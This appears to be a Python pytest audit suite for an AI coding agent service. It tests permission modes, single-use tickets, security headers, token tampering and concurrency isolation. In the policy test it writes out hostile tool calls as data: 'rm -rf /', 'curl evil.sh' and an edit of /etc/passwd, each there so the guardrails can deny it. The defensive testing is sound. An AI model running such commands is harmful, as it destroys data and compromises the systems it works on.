"""Comprehensive Security, Concurrency, Fuzzing & Real SDK/CLI Audit Suite (v2.2.0)."""

from __future__ import annotations

import asyncio
import os
import sqlite3
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from app.core.config import Settings
from app.core.events import EventType
from app.core.permissions import ApprovalManager, PermissionMode
from app.core.security import (
    EphemeralTicketStore,
    PersistentRevocationStore,
    RateLimiter,
    create_signed_token,
    decode_and_verify_signed_token,
    verify_signed_token,
)
from app.main import create_app
from app.runtime.adapters.cli import CLIAdapter
from app.runtime.adapters.sdk import SDKAdapter
from app.runtime.base import AgentAdapter, EventEmitter
from app.runtime.manager import AgentRuntimeManager
from app.services.session_service import SessionService


class _FastAuditAdapter(AgentAdapter):
    """Deterministic async adapter for parallel multi-session concurrency stress testing."""

    async def start_session(
        self, session_id: str, workspace: str, permission_mode: PermissionMode
    ) -> None:
        return None

    async def send_message(
        self,
        session_id: str,
        message: str,
        workspace: str,
        permission_mode: PermissionMode,
        emit: EventEmitter,
    ) -> None:
        await asyncio.sleep(0.01)
        await emit(EventType.TOOL_STARTED, {"tool": "audit_probe", "session": session_id})
        await asyncio.sleep(0.01)
        await emit(EventType.ASSISTANT_MESSAGE, {"delta": f"Echo:{message}"})
        await emit(EventType.TOOL_COMPLETED, {"tool": "audit_probe", "status": "ok"})

    async def cancel(self, session_id: str) -> None:
        return None

    async def close_session(self, session_id: str) -> None:
        return None


def _setup_audit_env(tmp_path: Path) -> tuple[TestClient, str]:
    strong_secret = "9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e"
    password = "SuperStrongAuditPassword2026!@#"
    ws_dir = tmp_path / "workspace"
    ws_dir.mkdir(parents=True, exist_ok=True)
    db_path = tmp_path / "audit_pocket.db"

    os.environ["APP_PASSWORD"] = password
    os.environ["APP_SECRET_KEY"] = strong_secret
    os.environ["AGY_WORKSPACE_DIR"] = str(ws_dir)
    os.environ["AGY_DB_PATH"] = str(db_path)

    settings = Settings(
        app_password=password,
        secret_key=strong_secret,
        workspace_dir=ws_dir,
        db_path=db_path,
    )
    app = create_app(custom_settings=settings)
    client = TestClient(app)
    res = client.post("/api/v1/auth/login", json={"password": password})
    assert res.status_code == 200
    return client, res.json()["token"]


def test_real_sdk_policy_enforcement_all_modes(tmp_path: Path) -> None:
    """Verify real google-antigravity (v0.1.23) policy hooks across READ_ONLY, ASSISTED, and AUTONOMOUS."""
    from google.antigravity import types
    from google.antigravity.hooks import policy

    async def _run() -> None:
        local_approvals = ApprovalManager()
        emitted_events: list[tuple[EventType, dict[str, Any]]] = []

        async def emit(event_type: EventType, payload: dict[str, Any]) -> None:
            emitted_events.append((event_type, payload))

        async def _mobile_handler(tool_call: Any, reason: str | None = None) -> bool:
            req = local_approvals.create_request(
                session_id="sess-assisted",
                tool_name=getattr(tool_call, "name", "sdk_tool"),
                command_or_target=str(getattr(tool_call, "args", "")),
                workspace=str(tmp_path),
                risk_description=reason or "Validation requise",
            )
            await emit(EventType.APPROVAL_REQUIRED, req.to_dict())
            approved = await local_approvals.wait_for_decision(
                req.approval_id, timeout=2.0
            )
            await emit(
                EventType.APPROVAL_RESOLVED,
                {"approval_id": req.approval_id, "approved": approved},
            )
            return approved

        # 1. READ_ONLY mode: view_file allowed, run_command & edit_file strictly denied
        ro_cfg = SDKAdapter.build_real_sdk_config(
            workspace=str(tmp_path),
            permission_mode=PermissionMode.READ_ONLY,
            system_instructions="Audit RO",
            ask_user_handler=_mobile_handler,
        )
        ro_hook = policy.enforce(ro_cfg.policies)

        res_view = await ro_hook.run(
            None, types.ToolCall(id="1", name="view_file", args={"path": "README.md"})
        )
        assert res_view.allow is True

        res_cmd = await ro_hook.run(
            None, types.ToolCall(id="2", name="run_command", args={"command": "rm -rf /"})
        )
        assert res_cmd.allow is False

        res_edit = await ro_hook.run(
            None, types.ToolCall(id="3", name="edit_file", args={"path": "app.py"})
        )
        assert res_edit.allow is False

        # 2. ASSISTED mode: view_file allowed automatically, sensitive tool triggers mobile approval
        assisted_cfg = SDKAdapter.build_real_sdk_config(
            workspace=str(tmp_path),
            permission_mode=PermissionMode.ASSISTED,
            system_instructions="Audit Assisted",
            ask_user_handler=_mobile_handler,
        )
        assisted_hook = policy.enforce(assisted_cfg.policies)

        res_view_assisted = await assisted_hook.run(
            None,
            types.ToolCall(
                id="4",
                name="view_file",
                args={"path": str(tmp_path / "main.py")},
            ),
        )
        assert res_view_assisted.allow is True

        # Test mobile approval = True
        async def _approve_soon() -> None:
            for _ in range(50):
                pending = [
                    r
                    for r in local_approvals.list_for_session("sess-assisted")
                    if r["status"] == "pending"
                ]
                if pending:
                    local_approvals.resolve(pending[0]["approval_id"], approved=True)
                    return
                await asyncio.sleep(0.01)

        approver = asyncio.create_task(_approve_soon())
        res_cmd_approved = await assisted_hook.run(
            None, types.ToolCall(id="5", name="run_command", args={"command": "pytest"})
        )
        await approver
        assert res_cmd_approved.allow is True

        # Test mobile approval = False (Rejected by user on phone)
        async def _reject_soon() -> None:
            for _ in range(50):
                pending = [
                    r
                    for r in local_approvals.list_for_session("sess-assisted")
                    if r["status"] == "pending"
                ]
                if pending:
                    local_approvals.resolve(pending[0]["approval_id"], approved=False)
                    return
                await asyncio.sleep(0.01)

        rejector = asyncio.create_task(_reject_soon())
        res_cmd_rejected = await assisted_hook.run(
            None, types.ToolCall(id="6", name="run_command", args={"command": "curl evil.sh"})
        )
        await rejector
        assert res_cmd_rejected.allow is False

        event_types = [t for t, _ in emitted_events]
        assert EventType.APPROVAL_REQUIRED in event_types
        assert EventType.APPROVAL_RESOLVED in event_types

        # 3. AUTONOMOUS mode: workspace tools allowed without interactive prompt, outside workspace denied
        auto_cfg = SDKAdapter.build_real_sdk_config(
            workspace=str(tmp_path),
            permission_mode=PermissionMode.AUTONOMOUS,
            system_instructions="Audit Auto",
            ask_user_handler=_mobile_handler,
        )
        auto_hook = policy.enforce(auto_cfg.policies)
        res_auto_in_ws = await auto_hook.run(
            None,
            types.ToolCall(
                id="7",
                name="edit_file",
                args={"path": str(tmp_path / "file.py")},
            ),
        )
        assert res_auto_in_ws.allow is True

        res_auto_outside_ws = await auto_hook.run(
            None,
            types.ToolCall(
                id="8",
                name="edit_file",
                args={"path": "/etc/passwd"},
            ),
        )
        assert res_auto_outside_ws.allow is False

    asyncio.run(_run())


def test_ticket_purpose_isolation_and_single_use(tmp_path: Path) -> None:
    """Prove ws tickets cannot download files or access REST APIs, and download tickets cannot open WS."""
    client, token = _setup_audit_env(tmp_path)
    headers = {"Authorization": f"Bearer {token}"}

    secret_file = tmp_path / "workspace" / "secret.txt"
    secret_file.write_text("confidential-payload", encoding="utf-8")

    # 1. Create a WebSocket ticket
    ws_ticket_res = client.post(
        "/api/v1/auth/ticket", json={"purpose": "ws"}, headers=headers
    )
    assert ws_ticket_res.status_code == 200
    ws_ticket = ws_ticket_res.json()["ticket"]

    # Attempt to use WS ticket on general REST endpoint -> must fail (401)
    rest_res = client.get(f"/api/v1/sessions?ticket={ws_ticket}")
    assert rest_res.status_code == 401

    # Attempt to use WS ticket on file download endpoint -> must fail (401)
    dl_res_wrong = client.get(f"/api/v1/files/download/secret.txt?ticket={ws_ticket}")
    assert dl_res_wrong.status_code == 401

    # 2. Create a Download ticket
    dl_ticket_res = client.post(
        "/api/v1/auth/ticket", json={"purpose": "download"}, headers=headers
    )
    assert dl_ticket_res.status_code == 200
    dl_ticket = dl_ticket_res.json()["ticket"]

    # Attempt to use Download ticket on WebSocket -> must fail with session_error + close(1008)
    sess_res = client.post(
        "/api/v1/sessions", json={"title": "Test"}, headers=headers
    )
    sid = sess_res.json()["session"]["session_id"]
    with client.websocket_connect(f"/ws/sessions/{sid}?ticket={dl_ticket}") as ws:
        err_msg = ws.receive_json()
        assert err_msg["type"] == "session_error"
        with pytest.raises(WebSocketDisconnect):
            ws.receive_json()

    # 3. Valid Download ticket works once and fails on second replay
    dl_ticket_2 = client.post(
        "/api/v1/auth/ticket", json={"purpose": "download"}, headers=headers
    ).json()["ticket"]
    ok_dl = client.get(f"/api/v1/files/download/secret.txt?ticket={dl_ticket_2}")
    assert ok_dl.status_code == 200
    assert ok_dl.text == "confidential-payload"

    replay_dl = client.get(f"/api/v1/files/download/secret.txt?ticket={dl_ticket_2}")
    assert replay_dl.status_code == 401


def test_http_security_headers_and_cache_control(tmp_path: Path) -> None:
    """Verify strict CSP, X-Frame-Options, X-Content-Type-Options, and Cache-Control headers."""
    client, token = _setup_audit_env(tmp_path)
    res_root = client.get("/")
    assert res_root.status_code == 200
    assert res_root.headers["X-Content-Type-Options"] == "nosniff"
    assert res_root.headers["X-Frame-Options"] == "DENY"
    assert res_root.headers["Referrer-Policy"] == "no-referrer"
    assert "default-src 'self'" in res_root.headers["Content-Security-Policy"]
    assert "frame-ancestors 'none'" in res_root.headers["Content-Security-Policy"]

    res_api = client.get(
        "/api/v1/auth/status", headers={"Authorization": f"Bearer {token}"}
    )
    assert res_api.status_code == 200
    assert res_api.headers["Cache-Control"] == "no-store"


def test_memory_bounds_dos_protection() -> None:
    """Ensure EphemeralTicketStore and RateLimiter strictly bound memory under flood attacks."""
    store = EphemeralTicketStore()
    for _ in range(500):
        store.issue_ticket(purpose="ws", ttl_seconds=60)
    assert len(store._tickets) <= EphemeralTicketStore.MAX_ACTIVE_TICKETS

    limiter = RateLimiter(max_failures=5, window_seconds=60)
    for i in range(5000):
        limiter.record_failure(f"192.0.2.{i}")
    assert len(limiter._failures) <= RateLimiter.MAX_TRACKED_CLIENTS


def test_token_tampering_and_persistent_sqlite_revocation(tmp_path: Path) -> None:
    """Fuzz token signatures, malformed structures, and verify SQLite persistent revocation."""
    _setup_audit_env(tmp_path)
    db_path = Path(os.environ["AGY_DB_PATH"])
    store1 = PersistentRevocationStore()

    token = create_signed_token(subject="mobile-admin", ttl_seconds=600)
    claims = decode_and_verify_signed_token(token)
    assert claims is not None
    assert verify_signed_token(token) is True

    # Tamper payload
    parts = token.split(".")
    tampered = parts[0] + "A." + parts[1]
    assert verify_signed_token(tampered) is False

    # Tamper signature
    tampered_sig = parts[0] + "." + ("0" * len(parts[1]))
    assert verify_signed_token(tampered_sig) is False

    # Revoke in store1 and verify a brand new store2 reading the same SQLite DB rejects it
    store1.revoke_jti(str(claims["jti"]), db_path=db_path)
    store2 = PersistentRevocationStore()
    assert store2.is_revoked(str(claims["jti"]), db_path=db_path) is True
    assert verify_signed_token(token) is False

    with sqlite3.connect(db_path) as conn:
        count = conn.execute("SELECT COUNT(*) FROM revoked_tokens").fetchone()[0]
    assert count == 1


def test_multi_session_parallel_concurrency_isolation(tmp_path: Path) -> None:
    """Run 5 concurrent sessions in parallel and verify zero cross-session event leakage."""

    async def _run() -> None:
        session_service = SessionService(db_path=tmp_path / "sessions.db")
        manager = AgentRuntimeManager(
            session_service=session_service,
            adapter=_FastAuditAdapter(),
        )

        sessions = [
            session_service.create_session(
                title=f"Concurrent-{i}",
                workspace=str(tmp_path),
                permission_mode=PermissionMode.AUTONOMOUS.value,
            )
            for i in range(5)
        ]

        tasks = [
            manager.start_background_turn(s["session_id"], f"UniquePayload-{idx}")
            for idx, s in enumerate(sessions)
        ]
        await asyncio.gather(*tasks)

        for idx, s in enumerate(sessions):
            sid = s["session_id"]
            persisted = session_service.get_events_since(sid, after_sequence=0)
            seqs = [e["sequence"] for e in persisted]
            assert seqs == list(range(1, len(seqs) + 1)), f"Seq gap in session {sid}: {seqs}"

            for ev in persisted:
                assert ev["session_id"] == sid
            all_text = " ".join(str(ev["payload"]) for ev in persisted)
            assert f"UniquePayload-{idx}" in all_text
            for other_idx in range(5):
                if other_idx != idx:
                    assert f"UniquePayload-{other_idx}" not in all_text

    asyncio.run(_run())


def test_cli_adapter_subprocess_group_kill_and_stderr_handling(tmp_path: Path) -> None:
    """Verify CLIAdapter runs a real subprocess, captures stdout/stderr, and kills process groups on cancel."""

    async def _run() -> None:
        fake_bin_dir = tmp_path / "bin"
        fake_bin_dir.mkdir()
        fake_agy = fake_bin_dir / "agy"
        fake_agy.write_text(
            "#!/usr/bin/env bash\n"
            "echo 'Starting agent work...'\n"
            "echo 'Warning diagnostics on stderr' >&2\n"
            "sleep 30\n",
            encoding="utf-8",
        )
        fake_agy.chmod(0o755)

        old_path = os.environ.get("PATH", "")
        os.environ["PATH"] = f"{fake_bin_dir}:{old_path}"
        try:
            adapter = CLIAdapter()
            events: list[tuple[EventType, dict[str, Any]]] = []

            async def emit(ev_type: EventType, payload: dict[str, Any]) -> None:
                events.append((ev_type, payload))

            task = asyncio.create_task(
                adapter.send_message(
                    session_id="cli-sess-1",
                    message="Test CLI cancellation",
                    workspace=str(tmp_path),
                    permission_mode=PermissionMode.AUTONOMOUS,
                    emit=emit,
                )
            )

            for _ in range(50):
                if any(t == EventType.ASSISTANT_MESSAGE for t, _ in events):
                    break
                await asyncio.sleep(0.05)

            await adapter.cancel("cli-sess-1")
            with pytest.raises(RuntimeError) as exc_info:
                await asyncio.wait_for(task, timeout=3.0)

            assert "Warning diagnostics on stderr" in str(exc_info.value)
            combined_output = " ".join(str(p) for _, p in events)
            assert "Starting agent work..." in combined_output
        finally:
            os.environ["PATH"] = old_path

    asyncio.run(_run())
